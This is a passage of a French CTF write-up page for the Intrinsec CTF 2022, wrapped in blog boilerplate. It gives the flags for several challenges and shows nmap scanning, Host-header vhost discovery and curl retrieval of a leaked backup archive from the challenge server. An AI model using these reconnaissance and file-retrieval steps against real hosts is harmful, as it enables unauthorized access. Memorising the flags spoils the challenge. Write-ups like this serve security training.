@@ -1,0 +1,2002 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Intrinsec CTF 2022 | leHack 2022 Edition</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Intrinsec&#32;CTF&#32;2022&#32;|&#32;leHack&#32;2022&#32;Edition />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Intrinsec&#32;CTF&#32;2022&#32;|&#32;leHack&#32;2022&#32;Edition />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Intrinsec&#32;CTF&#32;2022&#32;|&#32;leHack&#32;2022&#32;Edition />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Intrinsec&#32;CTF&#32;2022&#32;|&#32;leHack&#32;2022&#32;Edition />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022" />
+<meta itemprop="description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022" />
+<meta property="og:description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022" />
+<meta name="twitter:description" content="Writeup complet de tous les challenges du Intrinsec CTF 2022" />
+
+
+<base href="//localhost:1313/writeups/intrinsec-ctf-lehack2022/" />
+<link rel="canonical" href="//localhost:1313/writeups/intrinsec-ctf-lehack2022/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/intrinsec-ctf-lehack2022/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/intrinsec-ctf-lehack2022/" />
+<meta property="og:url" content="//localhost:1313/writeups/intrinsec-ctf-lehack2022/" />
+
+
+<meta property="og:updated_time" content="2022-06-30T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/intrinsec-ctf-lehack2022/">Intrinsec CTF 2022 | leHack 2022 Edition</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2022-06-30T12:00:00Z" class="post-date">
+        June 30, 2022
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>21 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-network">
+        <a href="//localhost:1313/tags/network">network</a>
+      </li>
+      
+      <li class="tag-tuto">
+        <a href="//localhost:1313/tags/tuto">tuto</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h1 id="description">Description</h1>
+<p>Ce CTF est proposé par <a href="https://www.intrinsec.com/" target="_blank">Intrinsec</a> , crée par <a href="https://twitter.com/th1b4ud" target="_blank">Th1b4ud</a> et est constitué de <code>12 Challenges</code>.
+On évolue tout au long des objectifs dans un réseau afin de compromettre toutes les machines les unes après les autres.</p>
+<h1 id="thèmes">Thèmes</h1>
+<ul>
+<li>Web</li>
+<li>Pivoting</li>
+<li>Blockchain (SmartContract)</li>
+<li>Forensic</li>
+</ul>
+<h1 id="prérequis">Prérequis</h1>
+<ul>
+<li>Du temps</li>
+<li>Un vps de préférence</li>
+<li>Connaissance basique de CTF</li>
+</ul>
+<p>*J&rsquo;ai appris beaucoup de choses pendant la compétition et c&rsquo;est assez facile à comprendre en faisant les challenges en parallèles. *</p>
+<h1 id="misc-intro--2-challenges">MISC <em>(Intro : 2 Challenges)</em></h1>
+<h2 id="discord">Discord</h2>
+<ul>
+<li><strong>Nom</strong>  : Discord</li>
+<li><strong>Point</strong> : 1</li>
+<li><strong>Description</strong> : Have you visited our wonderful discord server ? :) <a href="https://discord.gg/p8z4dCtAtk" target="_blank">https://discord.gg/p8z4dCtAtk</a></li>
+</ul>
+<h6 id="solution-">Solution :</h6>
+<p>On se rend sur leur Discord. On va dans la section <code>general</code>. Le flag est en haut de l&rsquo;écran :</p>
+<pre tabindex="0"><code>Mayve this string will help you : ISEC{1l0v3D1sc0rd}
+</code></pre><hr>
+<h2 id="rules">Rules</h2>
+<ul>
+<li><strong>Nom</strong>  : Rules</li>
+<li><strong>Point</strong> : 1</li>
+<li><strong>Description</strong> :Have you read the rules?</li>
+</ul>
+<h6 id="solution--1">Solution :</h6>
+<p>On se rend sur la page <a href="https://challenge.intrinsec.io/rules" target="_blank">/rules</a> puis on inspecte le code la page .</p>
+<pre tabindex="0"><code>&lt;!-- Good boy here your flag : ISEC{Ir34d3v3ryth1ng!} --&gt;
+</code></pre><h1 id="main-objective-6-challenges">MAIN OBJECTIVE <em>(6 Challenges)</em></h1>
+<h2 id="first-">First !</h2>
+<ul>
+<li><strong>Nom</strong>  : &ldquo;1 First !&rdquo;</li>
+<li><strong>Point</strong> : 10</li>
+<li><strong>Description</strong> :
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Our analysts found this IP : 20.126.99.66.
+</span></span><span style="display:flex;"><span>We are convinced that this address is part of their infrastructure. See <span style="color:#66d9ef">if</span> it is not possible to enter through there.
+</span></span></code></pre></div></li>
+</ul>
+<h6 id="solution--2">Solution :</h6>
+<p>La première chose à faire est de lancer un nmap sur l&rsquo;ip :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   nmap 20.126.99.66
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open     ssh
+</span></span><span style="display:flex;"><span>80/tcp   open     http
+</span></span><span style="display:flex;"><span>3000/tcp open     ppp
+</span></span><span style="display:flex;"><span>8000/tcp open     http-alt
+</span></span></code></pre></div><p>On peut se rendre sur les 3 pages des 3 derniers ports. Le premier étant un ssh pour l&rsquo;administration du CTF :</p>
+<p><img src="./img/1_port.png" alt="AltText"></p>
+<p>On a :</p>
+<ul>
+<li>Une page <strong>qui ressemble à une page de Microsoft office</strong></li>
+<li>Un login pour une banque</li>
+<li>Un PhpMyAdmin</li>
+</ul>
+<p>On trouve un <code>robots.txt</code> sur le port <strong>80</strong>.</p>
+<pre tabindex="0"><code>Flag-1 : ISEC{h0_y0u_F0und_M3!}
+</code></pre><hr>
+<h2 id="bad-practices">Bad practices</h2>
+<ul>
+<li><strong>Nom</strong>  : Bad practices</li>
+<li><strong>Point</strong> : 20</li>
+<li><strong>Description</strong> : They don&rsquo;t seem to use good practices.</li>
+</ul>
+<h6 id="solution--3">Solution :</h6>
+<p>En inspectant la page sur le <code>port 80</code>, on se rend compte de deux choses :</p>
+<ul>
+<li>Ce texte <code>&lt;!-- &lt;meta name=&quot;dev-platform&quot; content=&quot;dev.phishing.lan&quot;&gt; --&gt;</code></li>
+<li>Ce Code <code>&lt;form method=&quot;GET&quot; action=&quot;../../harvester.php&quot; name=&quot;LoginForm&quot; autocomplete=&quot;off&quot;&gt;</code></li>
+</ul>
+<p>Ce site est en réalité une fausse page !
+Essayons de regarder ce qu&rsquo;il se passe si on spécifie un <code>Host</code> en Header en lui mettant la valeur  <code>dev.phishing.lan</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 20.126.99.66 &gt; original.html
+</span></span><span style="display:flex;"><span>curl 20.126.99.66 -H <span style="color:#e6db74">&#39;Host:dev.phishing.lan&#39;</span> &gt; original_with_header.html
+</span></span><span style="display:flex;"><span>diff original.html original_with_header.html
+</span></span></code></pre></div><p>Résultat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;!-- Dev version. Remove backup files and /pages directory before move to production. Ty --&gt;
+</span></span></code></pre></div><p>Super ! On apprend l&rsquo;existence d&rsquo;une backup !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 20.126.99.66/backup/backup -H <span style="color:#e6db74">&#39;Host:dev.phishing.lan&#39;</span>
+</span></span></code></pre></div><p>Résultat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BACKUPTIME<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>date +%b-%d-%y<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>RANDOM_STRING<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>head /dev/urandom | tr -dc a-f0-9 | head -c 40<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>DESTINATION<span style="color:#f92672">=</span>backup-<span style="color:#e6db74">&#39;$BACKUPTIME&#39;</span>-<span style="color:#e6db74">&#39;$RANDOM_STRING&#39;</span>.tar.gz
+</span></span><span style="display:flex;"><span>SOURCEFOLDER<span style="color:#f92672">=</span>.
+</span></span><span style="display:flex;"><span>tar -cpzf $DESTINATION $SOURCEFOLDER
+</span></span></code></pre></div><p>Il y a ici un problème dans le script , <code>RANDOM_STRING</code> et <code>BACKUPTIME</code> ne sont pas exécutés , elles sont entre <code>`</code> .
+On peut donc aller chercher la backup !:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Host:dev.phishing.lan&#39;</span> <span style="color:#e6db74">&#39;http://20.126.99.66/backup/backup-$BACKUPTIME-$RANDOM_STRING.tar.gz&#39;</span>*
+</span></span></code></pre></div><p>Dedans on trouve :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root 127K Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> aad.login.js
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">211</span> Feb <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2020</span> backup
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  11K Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> favicon_a.ico
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">32</span> Feb <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2020</span> flag.txt
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">632</span> Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> harvester.php
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root 7.3K Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> index.php
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  85K Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> jquery.1.5.1.min.js
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  85K Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> jquery.1.5.1.min.js.1
